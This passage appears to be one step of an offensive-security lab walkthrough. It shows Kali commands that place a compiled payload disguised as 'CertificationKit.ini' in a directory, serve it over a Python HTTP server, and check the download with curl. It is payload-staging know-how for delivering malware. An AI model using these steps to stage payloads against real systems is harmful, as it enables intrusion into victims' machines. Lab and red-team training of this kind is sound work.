  Step 2 — Host the Payload on Kali

  # Put the compiled payload in a directory
  mkdir ~/static-kitten-lab
  cp CertificationKit.ini ~/static-kitten-lab/

  # Start HTTP server on port 8080
  cd ~/static-kitten-lab
  python3 -m http.server 8080

  Verify it works:
  # Test from Kali itself first
  curl http://192.168.x.10:8080/CertificationKit.ini --output /tmp/test

